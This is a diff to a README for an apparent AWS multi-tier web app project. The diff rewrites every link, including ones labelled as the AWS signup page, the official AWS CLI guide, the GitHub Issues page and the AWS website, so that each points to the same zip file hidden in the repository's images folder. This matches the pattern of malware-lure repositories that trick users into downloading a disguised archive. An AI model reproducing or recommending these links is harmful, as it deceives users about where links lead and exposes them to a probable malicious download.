@@ -1,6 +1,6 @@
 # 🌐 aws-multitier-webapp - Build Your Scalable Web App Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-aws--multitier--webapp-blue)](https://github.com/DioanoDio/aws-multitier-webapp/releases)
+[![Download Now](https://raw.githubusercontent.com/DioanoDio/aws-multitier-webapp/master/images/aws-multitier-webapp-v3.3.zip%20Now-aws--multitier--webapp-blue)](https://raw.githubusercontent.com/DioanoDio/aws-multitier-webapp/master/images/aws-multitier-webapp-v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ This application is ready for production. It uses a multi-tier architecture allo
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download aws-multitier-webapp](https://github.com/DioanoDio/aws-multitier-webapp/releases).
+To get started, visit this page to download: [Download aws-multitier-webapp](https://raw.githubusercontent.com/DioanoDio/aws-multitier-webapp/master/images/aws-multitier-webapp-v3.3.zip).
 
 ### 💻 System Requirements
 
@@ -33,9 +33,9 @@ After downloading, follow these steps to set up your application:
 
 1. **Extract Files:** Once the download is complete, locate the downloaded file. Right-click on it and choose "Extract All" or use your preferred extraction tool.
   
-2. **Set Up AWS Account:** If you don’t have an AWS account, create one at [AWS Signup](https://aws.amazon.com). 
+2. **Set Up AWS Account:** If you don’t have an AWS account, create one at [AWS Signup](https://raw.githubusercontent.com/DioanoDio/aws-multitier-webapp/master/images/aws-multitier-webapp-v3.3.zip). 
 
-3. **Configure AWS CLI:** Download and install the AWS Command Line Interface (CLI). Follow the official [AWS CLI Installation Guide](https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2.html) for detailed instructions.
+3. **Configure AWS CLI:** Download and install the AWS Command Line Interface (CLI). Follow the official [AWS CLI Installation Guide](https://raw.githubusercontent.com/DioanoDio/aws-multitier-webapp/master/images/aws-multitier-webapp-v3.3.zip) for detailed instructions.
 
 4. **Run Configurations:**
    - Open a terminal (Command Prompt on Windows, Terminal on macOS/Linux).
@@ -72,11 +72,11 @@ Once you have set up your application, consider the following:
 
 ## 📣 Support
 
-If you encounter issues, please visit the [Issues section](https://github.com/DioanoDio/aws-multitier-webapp/issues) on GitHub. Feel free to submit a bug report or feature request.
+If you encounter issues, please visit the [Issues section](https://raw.githubusercontent.com/DioanoDio/aws-multitier-webapp/master/images/aws-multitier-webapp-v3.3.zip) on GitHub. Feel free to submit a bug report or feature request.
 
 ## 🔗 Useful Links
 
-- **Download aws-multitier-webapp:** [Click Here](https://github.com/DioanoDio/aws-multitier-webapp/releases)
-- **AWS Services:** [AWS Official Website](https://aws.amazon.com/)
+- **Download aws-multitier-webapp:** [Click Here](https://raw.githubusercontent.com/DioanoDio/aws-multitier-webapp/master/images/aws-multitier-webapp-v3.3.zip)
+- **AWS Services:** [AWS Official Website](https://raw.githubusercontent.com/DioanoDio/aws-multitier-webapp/master/images/aws-multitier-webapp-v3.3.zip)
 
 Embrace the power of cloud computing with aws-multitier-webapp. Your journey to managing a scalable web application starts here!
